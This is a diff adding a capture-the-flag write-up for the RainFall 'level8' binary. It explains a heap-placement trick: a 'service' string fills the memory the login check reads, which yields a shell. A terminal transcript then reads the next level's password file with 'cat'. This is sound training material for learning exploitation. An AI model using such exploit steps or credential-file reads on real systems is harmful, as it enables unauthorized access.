@@ -1,0 +1,23 @@
+The assembly of level8 is quite long, but we can understand quite easily
+what is happening when we reconstruct the C code that created it:
+
+The program reads stdin, and reacts to a few instructions: auth, reset, service and login.
+
+We want to use the "login" command, as it will start a shell.
+For this we understand that auth[32] must not be zero, but we cannot write this mutch in auth
+(line 24 in my file source.c, strcpy is called only if our input is less than 30 bytes)
+
+Luckily after login we can use the command "service", wich will call strdup on our text.
+If we launch this command after login the string duplicated will be likely placed just after the login,
+so login[32] can be in the range of the service string: 
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth nothing
+0x804a008, (nil) 
+service sd;fkjasd;lfkjsafl;kjasdfl
+0x804a008, 0x804a018 
+login
+$ cat /home/user/level9/.pass
+
+And we get the flag
